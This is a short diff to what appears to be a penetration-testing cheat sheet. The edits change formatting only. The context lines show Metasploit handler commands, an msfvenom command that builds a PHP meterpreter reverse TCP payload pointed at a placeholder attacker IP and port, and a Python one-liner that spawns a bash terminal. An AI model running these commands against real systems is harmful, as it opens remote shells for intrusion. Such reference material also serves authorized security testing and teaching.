@@ -15,7 +15,7 @@ msf6 > set ExitOnSession false
 msf6 > exploit -j -z
 ```
 <br/>
-Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r 
+Once the required values are completed the following command will execute your handler: ‘msfconsole -L -r' 
 <br/>
 
 #### Scripting Payloads
@@ -26,7 +26,7 @@ $ msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-po
 
 
 ### Python
-##### spawn a terminal 
+#### spawn a terminal 
 ```python
 $ python -c 'import pty;pty.spawn("/bin/bash")';
 ```
